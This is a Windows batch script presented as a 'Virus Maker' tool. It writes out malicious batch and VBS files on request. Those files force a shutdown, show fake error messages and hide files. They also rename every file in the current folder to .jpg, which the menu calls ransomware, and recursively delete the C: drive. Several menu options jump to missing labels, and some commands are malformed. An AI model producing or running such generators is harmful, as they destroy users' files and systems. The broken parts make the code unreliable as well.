@echo off
mode con cols=60 lines=50
title Virus Maker
color a
:1
cls
echo            Virus Maker V4 ProMax
echo            DEV : Jonathan Jackson
echo                This is easy       
echo                  [ ;_; ]
echo                [==========]
echo                Let's Start!    
echo            Press Enter to Start
pause >nul
:Create
cls
echo --------------------------------------------------------
echo -              This is all virus                       -
echo --------------------------------------------------------
echo -1=Shutdown                -5=Open cmd                 -
echo -2=Messenger Box           -6=create Folder continuity -
echo -3=hide file               -7=ransomware               -
echo -4=Delete Windows          -8=delete C                 -
echo --------------------------------------------------------
set /p o=What do you want:
if %o% == 1 goto Shutdown
if %o% == 2 goto Msg
if %o% == 3 goto hide
if %o% == 4 goto delwin
if %o% == 5 goto cmd
if %o% == 6 goto md
if %o% == 7 goto ransom
if %o% == 8 goto delc
if %o% == 9 goto 
if %o% == 10 goto notepad
if %o% == 11 goto time
if %o% == 12 goto all
goto p
:p
cls
echo Some thing wrong
goto Create
:Shutdown
set /p t=Namefilevirus:
set /p u=Time Shutdown:
set /p poo=Messengershutdown:
echo shutdown.exe -s -t %u% -c "%poo%" >%t%.bat
Goto Choose
:Msg
set /p Name=Name Virus:
set /p r=Messenger:
echo X=MsgBox("%r%",0+16,"Error") > %Name%.vbs
goto Choose
:hide
set /p hahhahaha=Namevirus:
echo attrib +s +h +r >%hahhahaha%.bat
goto Choose
:delwin
set /p kkk=NameVirus:
echo Del C:\ *.* |y >%kkk%.bat
goto Choose
:cmd
set /p cmd=NameVirus:
echo Start cmd.exe >%cmd%.bat
goto Choose
:md
set /p haahuhu=NameVirus:
echo mkdir 001 002 003 004 005 006 007 008 009 010 011 012 017463242 014 015 016 017 018 019 0 013 01230323543454 5045 6074 744655435 7645 4503 3503 6 3 63 0666 02  89 898 68 87 55 87162376 873 95842432 987678968924 252432429 69869  8927847626264 634765698278 4 22 42964962 92 94 9264 92426464 2476292 429 4692 64 49 34 6234923649 83498296426 761623 6761736 761863 761638 67168 126 716763169 76 176361 7616361 6871663 716236 12663 617636166 1234567899 891725 317623621 71523512  71525 21111111111111 3333333333333333333     22222222222222222 3333333333333333333333333333333 4444444444444444444444444444 555555555555555 66666666666666666666 7777777777777777777 888888888888888 9999999999999999999 ayud  ahsuhdu ayhsuidyh ywuqtuiyuguid jxhjcbjkba qywy9godgyau gjagxbuhga wuqty sndas adguig8t8 wqytyyr9uioefd sgfhagiu t9r y623gf dasgd t32ragsd sagd 3t87dahsbg d38 re ad7 t737dadbsbd 7t7q tdgsbahdbi gatgui d da sdauguiu uahiutdiua guyoieuortgwt4 >%haahuhu%.bat
goto Choose
:ransom
set /p oooooo=NameVirus:
echo ren *.* *.jpg >%oooooo%.bat
goto Choose
:delc
set /p jkjkkj=NameVirus:
echo del c:\ /s/q >%jkjkkj%.bat
goto Choose
:Choose
goto Create
